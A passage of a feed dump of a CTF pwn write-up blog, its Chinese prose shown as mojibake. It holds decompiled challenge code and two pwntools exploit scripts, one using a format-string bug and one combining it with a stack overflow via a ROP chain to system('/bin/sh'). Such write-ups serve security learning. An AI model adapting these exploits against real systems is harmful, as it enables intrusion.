class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-64h] BYREF</span></span><br><span class="line">  <span class="type">int</span> nbytes_4; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  _DWORD v7[<span class="number">3</span>]; <span class="comment">// [rsp+14h] [rbp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  <span class="type">void</span> *v11; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)&amp;v7[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">myinit</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Init Data size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Err&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your Json:&quot;</span>);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(nbytes + <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, (<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">  v10 = <span class="built_in">checkjson</span>((__int64)buf);</span><br><span class="line">  <span class="keyword">if</span> ( !v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Parse fail&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">menu</span>();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes_4);</span><br><span class="line">      <span class="built_in">getchar</span>();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Data name:&quot;</span>);</span><br><span class="line">      <span class="built_in">fgets</span>(s, <span class="number">0x18</span>, stdin);</span><br><span class="line">      s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( nbytes_4 == <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( nbytes_4 &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">      <span class="keyword">switch</span> ( nbytes_4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;New data len:&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v7);</span><br><span class="line">          <span class="built_in">getchar</span>();</span><br><span class="line">          <span class="keyword">if</span> ( v7[<span class="number">0</span>] &gt; <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = <span class="built_in">malloc</span>(v7[<span class="number">0</span>] + <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;New data:&quot;</span>);</span><br><span class="line">            <span class="built_in">read</span>(<span class="number">0</span>, v11, v7[<span class="number">0</span>]);</span><br><span class="line">            v4 = <span class="built_in">sub_5603</span>(v11);</span><br><span class="line">            <span class="built_in">sub_53BA</span>(v10, (__int64)s, v4);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Edit ok&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          v8 = (<span class="type">char</span> *)<span class="built_in">sub_317E</span>(v10);</span><br><span class="line">          <span class="built_in">puts</span>(v8);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          *(_QWORD *)&amp;v7[<span class="number">1</span>] = <span class="built_in">sub_4662</span>(v10, (__int64)s);</span><br><span class="line">          <span class="keyword">if</span> ( !*(_QWORD *)&amp;v7[<span class="number">1</span>] )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;target null&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( *(_DWORD *)(*(_QWORD *)&amp;v7[<span class="number">1</span>] + <span class="number">24LL</span>) == <span class="number">16</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%s]: %s\n&quot;</span>, s, *(<span class="type">const</span> <span class="type">char</span> **)(*(_QWORD *)&amp;v7[<span class="number">1</span>] + <span class="number">32LL</span>));</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( *(_DWORD *)(*(_QWORD *)&amp;v7[<span class="number">1</span>] + <span class="number">24LL</span>) == <span class="number">8</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%s]: %d\n&quot;</span>, s, *(<span class="type">unsigned</span> <span class="type">int</span> *)(*(_QWORD *)&amp;v7[<span class="number">1</span>] + <span class="number">40LL</span>));</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Err Type&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Read ok&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">LABEL_25:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;err&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v10 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">del</span>(v10, s);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Delete ok&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;parse fail.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯è¾“å…¥ä¸€ä¸ªsizeï¼Œjsonç„¶åä¹Ÿæ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§çš„ç¨‹åºï¼Œåœ¨deleteå‡½æ•°ä¸­å­˜åœ¨ä¸€ä¸ªæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">del</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">sub_4662</span>(a1, a2);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(a2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;] been deleted&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_4E2F</span>(a1, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ€è·¯å°±æ˜¯æ³„éœ²-&gt;è¦†ç›–ï¼Œä¹Ÿæ˜¯æ¯”è¾ƒæ¸…æ™°çš„</p><h2 id="è§£æ³•ä¸€ï¼š"><a href="#è§£æ³•ä¸€ï¼š" class="headerlink" title="è§£æ³•ä¸€ï¼š"></a>è§£æ³•ä¸€ï¼š</h2><p>çº¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n     :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line">fmt =<span class="keyword">lambda</span> string:<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28282</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, execute=duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;\n&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Data name:\n&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line">og=[<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">sla(<span class="string">b&#x27;Init Data size: \n&#x27;</span>,<span class="string">b&#x27;20&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Your Json:\n&#x27;</span>,<span class="string">b&#x27;21&#x27;</span>)</span><br><span class="line">show(<span class="string">b&#x27;%27$p%10$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_ret=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">0x8</span></span><br><span class="line">leak(<span class="string">&#x27;stack_ret&#x27;</span>,stack_ret)</span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+og[<span class="number">1</span>]</span><br><span class="line">leak(<span class="string">&#x27;one_gadget&#x27;</span>,one_gadget)</span><br><span class="line"></span><br><span class="line">payload=(fmt(<span class="string">&#x27;%&#123;one_gadget &amp; 0xffff&#125;c&#x27;</span>)+<span class="string">b&#x27;%22$hn&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(stack_ret)</span><br><span class="line">show(payload)</span><br><span class="line"></span><br><span class="line">payload=(fmt(<span class="string">&#x27;%&#123;(one_gadget&gt;&gt;16) &amp; 0xffff&#125;c&#x27;</span>)+<span class="string">b&#x27;%22$hn&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(stack_ret+<span class="number">2</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">show(payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt;\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;name:\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•äºŒï¼š"><a href="#è§£æ³•äºŒï¼š" class="headerlink" title="è§£æ³•äºŒï¼š"></a>è§£æ³•äºŒï¼š</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´+æ ˆæº¢å‡º</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *__fastcall <span class="title">sub_15B6</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 (__fastcall **a2)(<span class="type">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+10h] [rbp-9A0h]</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [rsp+18h] [rbp-998h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">632</span>]; <span class="comment">// [rsp+730h] [rbp-280h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+9A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  n = <span class="built_in">strlen</span>(a1) + <span class="number">1</span>;</span><br><span class="line">  v4 = (<span class="type">void</span> *)(*a2)(n);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n &lt;= <span class="number">0xFFF</span> )</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(v4, a1, n);</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªå‡½æ•°ä¸­å¦‚æœn&lt;0xFFFåŒæ—¶deståªæœ‰632çš„å¤§å°ï¼Œé‚£ä¹ˆå°±æœ‰ä¸ªæ ˆæº¢å‡º</p><p>å–è‡ªixoutå­¦é•¿çš„expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Init Data size: \n&#x27;</span>,tbs(<span class="number">120</span>))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Your Json:\n&#x27;</span>,<span class="string">b&#x27;&#123;&quot;a&quot;:&quot;b&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;%p%25$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address=<span class="built_in">int</span>(ru(<span class="string">&#x27;23&#x27;</span>)[-<span class="number">12</span>:],<span class="number">16</span>)-<span class="number">0x1ED723</span></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line">canary=<span class="built_in">int</span>(ru(<span class="string">&#x27;]&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">16</span>:],<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc.address+<span class="number">0x23b6a</span></span><br><span class="line">ret=libc.address+<span class="number">0x23b6b</span></span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#dbg(&#x27;b *$rebase(0x15B6)&#x27;)</span></span><br><span class="line">edit(<span class="string">b&#x27;ixout&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">632</span>+p64(canary)+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(binsh)+p64(ret)+p64(system))</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><hr><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://ixout.github.io/posts/22716/">https://ixout.github.io/posts/22716/</a></p><p><a href="https://www.ctfiot.com/189832.html">https://www.ctfiot.com/189832.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ¯”èµ›çš„æ—¶å€™å…¨é fixå¾—åˆ†ï¼Œä¹Ÿæ˜¯å‚ä¸ä¸Šäº†&lt;/p&gt;
&lt;h1 id=&quot;baby-jit&quot;&gt;&lt;a href=&quot;#baby-jit&quot; class=&quot;headerlink&quot; title=&quot;baby_jit&quot;&gt;&lt;/a&gt;baby_jit&lt;/h1&gt;&lt;figure class=&quot;highlig</summary>
      
    
    
    
    <category term="èµ›åå¤ç›˜" scheme="http://s1nec-1o.github.io/categories/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%9B%98/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>è°ˆéæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²</title>
    <link href="http://s1nec-1o.github.io/2024/08/05/%E8%B0%88%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>http://s1nec-1o.github.io/2024/08/05/%E8%B0%88%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
    <published>2024-08-05T03:02:34.000Z</published>
    <updated>2024-08-20T11:12:45.772Z</updated>
    
    <content type="html"><![CDATA[<ul><li><strong>%hhnï¼ˆå†™å…¥ä¸€å­—èŠ‚ï¼‰</strong></li><li><strong>%hnï¼ˆå†™å…¥ä¸¤å­—èŠ‚ï¼‰</strong></li><li><strong>%nï¼ˆ32ä½å†™å››å­—èŠ‚ï¼‰</strong></li><li><strong>%ln &#x2F; %llnï¼ˆå†™å…¥å…«å­—èŠ‚ï¼‰</strong></li></ul><h1 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining_playfmt"></a>hitcontraining_playfmt</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051105164.png" alt="image-20240729154014016"></p><p>é¦–å…ˆæ˜¯è®¾ç½®è¾“å‡ºä¸ºæ— ç¼“å†²æ¨¡å¼ï¼Œç„¶åä»¥å‚æ•°çš„æ•°é‡çš„åœ°å€ä¼ å‚</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051105271.png" alt="image-20240729154330774"></p><p>é‡Œé¢è°ƒç”¨do_fmtå‡½æ•°ï¼Œæ˜¾ç„¶æ˜¯ä¸€ä¸ªéæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051106088.png" alt="image-20240729154408434"></p><p>æ²¡æœ‰ä¿æŠ¤ï¼Œä¸”æœ‰RWXæ®µï¼Œgdbè¿›å»å¯ä»¥çœ‹åˆ°æ ˆä¾¿æ˜¯RWXæ®µï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆè½¯ç”¨ï¼Œå› ä¸ºæ˜¯éæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²</p><p>è¿™é¢˜æ˜¯é€šè¿‡åœ¨bufæ®µæ„é€ shellcodeçš„ï¼Œå› ä¸ºæ˜¯è€é¢˜äº†ï¼Œåœ¨å¾ˆoldçš„å†…æ ¸ç‰ˆæœ¬çš„æ•°æ®æ®µæ˜¯å¯æ‰§è¡Œçš„ï¼Œç›´åˆ°5ç‚¹å¤šæ‰ä¸å¯æ‰§è¡Œçš„</p><p>å› æ­¤å°±çœ‹ä¸€ä¸ªæ€è·¯å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 